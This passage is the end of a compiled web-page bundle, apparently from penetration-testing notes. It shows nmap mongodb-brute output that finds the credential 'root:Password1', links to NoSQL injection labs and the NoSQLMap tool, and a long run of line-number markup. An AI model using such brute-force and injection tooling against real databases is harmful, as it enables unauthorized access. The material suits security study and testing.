<span class="token operator">|</span> mongodb<span class="token operator">-</span>brute<span class="token punctuation">:</span>
<span class="token operator">|</span>   Accounts
<span class="token operator">|</span>     root<span class="token punctuation">:</span>Password1 <span class="token operator">-</span> Valid credentials
<span class="token operator">|</span>   Statistics
<span class="token operator">|</span>_    Performed <span class="token number">3542</span> guesses <span class="token keyword">in</span> <span class="token number">9</span> seconds<span class="token punctuation">,</span> average tps<span class="token punctuation">:</span> <span class="token number">393</span>



https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>digininja<span class="token operator">/</span>nosqlilab
https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Charlie<span class="token operator">-</span>belmer<span class="token operator">/</span>nosqli
https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>codingo<span class="token operator">/</span>NoSQLMap




NoSqlMap
https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>codingo<span class="token operator">/</span>NoSQLMap
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),o=[t];function l(c,i){return s(),a("div",null,o)}const r=n(e,[["render",l],["__file","tmp.html.vue"]]);export{r as default};
